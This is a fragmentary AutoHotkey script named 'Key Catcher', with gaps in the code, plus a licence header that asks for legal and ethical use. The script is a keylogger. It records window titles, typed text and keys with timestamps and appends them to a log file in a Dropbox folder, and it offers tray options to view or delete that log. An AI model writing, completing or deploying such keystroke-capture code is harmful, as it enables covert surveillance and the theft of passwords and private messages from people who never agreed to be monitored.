...
v1.00.3b modified 1/14/11 3:28am

Key Catcher is free for both business and personal use. It can be freely modified and redistributed providing that, 
1. all notices remain intact, 
2. you acknowledge where it originally came from, 
3. it is only used for legal and ethical purposes, 
4. no profit is derived from its distribution.
*/
...
menu, tray, Icon, C:\Users\michel\Documents\DropBox\Scripts\Scripts\key.ico, , 1
	...
	if wintitle not contains %windowblacklist%
	{
		...
		if length > 2
		{
			...
			if wintitle not contains %windowblacklist%
			{
				...
				{
					fileappend, `n%wintitle%`n, C:\Users\michel\Documents\DropBox\Documenten\log.txt
					wintitleold = %wintitle%
				}
				
				stringreplace, text, text, , %blank%
				time=%a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
				fileappend, %time%%A_Tab%%text%%A_Tab%%key%`n, C:\Users\michel\Documents\DropBox\Documenten\log.txt
			}
		}
	}
}
...
{
	time = %a_dd%/%a_mm%/%a_yyyy% %a_hour%:%a_min%:%a_sec%
	fileappend, %time% - %content%`n, C:\Users\michel\Documents\DropBox\Documenten\log.txt
	emptymem()
}
return
...
view:
{
	fileinstall, C:\Users\michel\Documents\DropBox\Documenten\log.txt, C:\Users\michel\Documents\DropBox\Documenten\log.txt, 0
	runwait, C:\Users\michel\Documents\DropBox\Documenten\log.txt
	emptymem()
}
return
...
delete:
{
	ifexist, C:\Users\michel\Documents\DropBox\Documenten\log.txt
	{
		msgbox, 33, Confirm Delete, Delete log?

		ifmsgbox, ok
		{
			filerecycle, C:\Users\michel\Documents\DropBox\Documenten\log.txt
	...
	ifnotexist, C:\Users\michel\Documents\DropBox\Documenten\log.txt
	{
